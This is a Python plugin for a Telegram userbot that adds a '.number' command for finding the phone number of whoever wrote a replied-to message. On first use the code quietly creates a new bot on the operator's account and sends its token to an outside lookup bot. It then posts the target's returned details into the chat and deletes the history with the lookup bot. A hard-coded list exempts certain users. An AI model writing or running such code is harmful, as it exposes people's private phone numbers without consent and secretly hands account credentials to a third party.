import asyncio
import os
import random
import string
import re
from telethon import events
from telethon.tl.functions.messages import DeleteHistoryRequest
from faust_tool.core.loader import register_command

BLOCKED_USERS = {
    813119487, 6279401007, 1305401434, 5234646261,
    6763566253, 6459482350, 6846377110, 6979848012,
    6735907620, 2028994500, 6872658510, 1305401434,
    1083671446, 1250830340
}

def register(client):
    @register_command(client, "number", r"\.number", "Деанон номера по реплаю")
    async def handler(event):
        if not event.is_reply:
            await event.edit("Используйте команду реплаем на чьё-то сообщение.")
            return

        reply_msg = await event.get_reply_message()
        if reply_msg.sender_id in BLOCKED_USERS:
            await event.edit("На этого пользователя команда .number не действует.")
            return

        user_id = reply_msg.sender_id
        deanon_bot = '@black_faust_bot'
        botfather = '@BotFather'
        chat_id = event.chat_id

        status_msg = await event.edit("Идёт проверка...")

        if not os.path.exists("register_num.txt"):
            open("register_num.txt", "w").close()
            await status_msg.edit("Первичная настройка...")

            await client.send_message(botfather, "/start")
            await asyncio.sleep(1)

            await client.send_message(botfather, "/newbot")
            await asyncio.sleep(1)

            bot_name = ''.join(random.choices(string.ascii_lowercase, k=9))
            await client.send_message(botfather, bot_name)
            await asyncio.sleep(1)

            bot_username = bot_name + "_bot"
            await client.send_message(botfather, bot_username)
            await asyncio.sleep(2)

            async for msg in client.iter_messages(botfather, limit=5):
                token_match = re.search(r'\b(\d{9,}:[\w-]{30,})\b', msg.text)
                if token_match:
                    bot_token = token_match.group(1)
                    break
            else:
                await status_msg.edit("Ошибка, повторите попытку позже, или сообщите о ней разработчику")
                return

            await client.send_message(deanon_bot, "/start")
            await asyncio.sleep(3)

            async for msg in client.iter_messages(deanon_bot, limit=1):
                buttons_message = msg
                break

            await asyncio.sleep(1)
            try:
                await buttons_message.click(data=buttons_message.buttons[0][1].data)
            except Exception as e:
                await status_msg.edit(f"Ошибка, сообщите о ней разработчику: {e}")
                return

            await asyncio.sleep(2)

            async for msg in client.iter_messages(deanon_bot, limit=1):
                buttons_message = msg
                break

            try:
                await buttons_message.click(data=buttons_message.buttons[0][0].data)
            except Exception as e:
                await status_msg.edit(f"Ошибка, сообщите о ней разработчику: {e}")
                return

            await asyncio.sleep(1)
            await client.send_message(deanon_bot, bot_token)
            await asyncio.sleep(5)

        await status_msg.edit("Запрос отправлен...")

        await client.send_message(deanon_bot, "/start")
        await asyncio.sleep(1)

        first_response = asyncio.get_event_loop().create_future()

        async def response_handler(e):
            if e.chat_id == (await client.get_entity(deanon_bot)).id and not first_response.done():
                first_response.set_result(e)

        client.add_event_handler(response_handler, events.NewMessage(from_users=deanon_bot))

        try:
            await client.send_message(deanon_bot, str(user_id))
            response = await asyncio.wait_for(first_response, timeout=15)
        except asyncio.TimeoutError:
            client.remove_event_handler(response_handler)
            await status_msg.edit("Не ответил вовремя. Повторите позже.")
            return

        client.remove_event_handler(response_handler)

        try:
            found = False
            for row in response.buttons:
                for button in row:
                    if button.text.lower() == "telegram":
                        await response.click(data=button.data)
                        found = True
                        break
                if found:
                    break

            if not found:
                await status_msg.edit("Не удалось обработать запрос, сообщите разработчику.")
                return
        except Exception as e:
            await status_msg.edit(f"Ошибка при работе: {e}")
            return

        await asyncio.sleep(5)

        async for msg in client.iter_messages(deanon_bot, limit=1):
            try:
                await client.send_message(chat_id, msg.text)
                await event.delete()
                await status_msg.delete()
            except Exception as e:
                await status_msg.edit(f"Не удалось получить ответ: {e}")

        try:
            entity = await client.get_entity(deanon_bot)
            await client(DeleteHistoryRequest(peer=entity, max_id=0, revoke=True))
        except Exception as e:
            print(f"Ошибка, сообщите о ней разработчику: {e}")
